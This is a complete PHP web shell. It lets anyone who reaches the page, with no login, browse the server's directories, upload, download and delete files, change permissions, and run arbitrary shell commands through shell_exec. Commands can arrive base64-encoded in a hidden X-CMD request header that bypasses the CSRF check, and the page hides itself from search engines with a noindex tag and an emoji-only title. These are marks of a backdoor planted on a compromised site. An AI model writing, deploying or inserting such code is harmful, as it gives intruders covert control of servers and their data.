<?php
session_start();

if (!isset($_SESSION['token'])) {
    $_SESSION['token'] = bin2hex(random_bytes(16));
}

function b64u_encode($str) {
    return rtrim(strtr(base64_encode($str), '+/', '-_'), '=');
}
function b64u_decode($str) {
    $pad = strlen($str) % 4;
    if ($pad > 0) {
        $str .= str_repeat('=', 4 - $pad);
    }
    return base64_decode(strtr($str, '-_', '+/'));
}

$param_path = 'p';
$param_cmd  = 'q';
$token_name = 'csrf_token';

$cwd = getcwd();
if (isset($_GET[$param_path])) {
    $decoded = b64u_decode($_GET[$param_path]);
    if ($decoded !== false && is_dir($decoded)) {
        $cwd = $decoded;
    }
}

$files = scandir($cwd);

$upload_msg = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    if (!isset($_POST[$token_name]) || $_POST[$token_name] !== $_SESSION['token']) {
        die("⛔ CSRF token invalid");
    }
    $dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
        $upload_msg = "✅ Upload success: " . htmlspecialchars($dest);
    } else {
        $upload_msg = "❌ Upload failed";
    }
}

if (isset($_POST['delete']) && isset($_POST[$token_name])) {
    if ($_POST[$token_name] === $_SESSION['token']) {
        $target = $cwd . DIRECTORY_SEPARATOR . hex2bin($_POST['delete']);
        if (is_file($target)) {
            unlink($target);
        } elseif (is_dir($target)) {
            rmdir($target);
        }
    }
}

if (isset($_POST['chmod']) && isset($_POST['perm']) && isset($_POST[$token_name])) {
    if ($_POST[$token_name] === $_SESSION['token']) {
        $target = $cwd . DIRECTORY_SEPARATOR . hex2bin($_POST['chmod']);
        $perm = octdec($_POST['perm']);
        chmod($target, $perm);
    }
}

$cmd_output = '';
$exec_func = 'shell_exec';
$input_cmd = '';

if (isset($_SERVER['HTTP_X_CMD'])) {
    $input_cmd = b64u_decode($_SERVER['HTTP_X_CMD']);
} elseif (isset($_POST[$param_cmd])) {
    if (!isset($_POST[$token_name]) || $_POST[$token_name] !== $_SESSION['token']) {
        die("⛔ CSRF token invalid");
    }
    $input_cmd = b64u_decode($_POST[$param_cmd]);
}

if ($input_cmd !== '') {
    $safe_cwd = escapeshellarg($cwd);
    $safe_cmd = $input_cmd;
    $cmd_output = $exec_func("cd $safe_cwd && $safe_cmd 2>&1");
}

function makeLink($path, $param) {
    return "?$param=" . b64u_encode($path);
}
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>📁</title>
<meta name="robots" content="noindex, nofollow">
<style>
    body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
    a { color: #0ff; text-decoration: none; }
    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
    th, td { padding: 6px 10px; border-bottom: 1px solid #333; }
    .nav a { margin-right: 5px; }
    input, select, button { font-family: monospace; }
    textarea { width: 100%; height: 200px; background: #222; color: #0f0; border: none; resize: vertical; padding: 10px; }
    form.inline { display: inline; margin: 0; padding: 0; }
    button { padding: 5px 10px; background: #0f0; border: none; cursor: pointer; font-weight: bold; }
    button:hover { background: #0c0; }
</style>
</head>
<body>

<div class="nav">
    <a href="<?= makeLink('/', $param_path) ?>">🏠 /</a>
    <?php
    $parts = explode(DIRECTORY_SEPARATOR, $cwd);
    $build = '';
    foreach ($parts as $part) {
        if ($part === '') continue;
        $build .= DIRECTORY_SEPARATOR . $part;
        echo '<a href="' . makeLink($build, $param_path) . '">' . htmlspecialchars($part) . '</a>/';
    }
    ?>
</div>

<?php if (!empty($upload_msg)): ?>
    <p><?= htmlspecialchars($upload_msg) ?></p>
<?php endif; ?>

<form method="post" enctype="multipart/form-data">
    <input type="hidden" name="<?= $token_name ?>" value="<?= $_SESSION['token'] ?>">
    <input type="file" name="file" onchange="this.form.submit()">
</form>

<table>
    <tr><th>Name</th><th>Type</th><th>Size</th><th>🛠 Action</th></tr>
    <?php foreach ($files as $file):
        if ($file === '.') continue;
        $full = $cwd . DIRECTORY_SEPARATOR . $file;
        $encoded = bin2hex($file);
    ?>
    <tr>
        <td>
            <?= is_dir($full)
                ? '<a href="' . makeLink($full, $param_path) . '">📁 ' . htmlspecialchars($file) . '</a>'
                : '📄 ' . htmlspecialchars($file) ?>
        </td>
        <td><?= is_dir($full) ? 'DIR' : 'FILE' ?></td>
        <td><?= is_file($full) ? filesize($full) . ' B' : '-' ?></td>
        <td>
            <?php if (is_file($full)): ?>
                <a href="<?= makeLink($cwd, $param_path) ?>&download=<?= b64u_encode($file) ?>">⬇️</a>
            <?php endif; ?>

            <form method="post" class="inline">
                <input type="hidden" name="<?= $token_name ?>" value="<?= $_SESSION['token'] ?>">
                <input type="hidden" name="delete" value="<?= $encoded ?>">
                <button type="submit" title="Delete">🗑️</button>
            </form>

            <form method="post" class="inline">
                <input type="hidden" name="<?= $token_name ?>" value="<?= $_SESSION['token'] ?>">
                <input type="hidden" name="chmod" value="<?= $encoded ?>">
                <input type="text" name="perm" size="3" placeholder="755">
                <button type="submit" title="CHMOD">🔐</button>
            </form>
        </td>
    </tr>
    <?php endforeach; ?>
</table>

<?php
if (isset($_GET['download'])) {
    $filename = $cwd . DIRECTORY_SEPARATOR . b64u_decode($_GET['download']);
    if (file_exists($filename) && is_file($filename)) {
        header("Content-Type: application/octet-stream");
        header("Content-Disposition: attachment; filename=\"" . basename($filename) . "\"");
        readfile($filename);
        exit;
    }
}
?>

<form method="post" class="cmd-form" autocomplete="off">
    <input type="text" name="<?= $param_cmd ?>" style="width:80%" placeholder="ls -lah" required>
    <input type="hidden" name="<?= $token_name ?>" value="<?= $_SESSION['token'] ?>">
    <button type="submit">▶️</button>
</form>

<?php if ($cmd_output !== ''): ?>
    <h3>🖥️</h3>
    <textarea readonly><?= htmlspecialchars($cmd_output) ?></textarea>
<?php endif; ?>

</body>
</html>
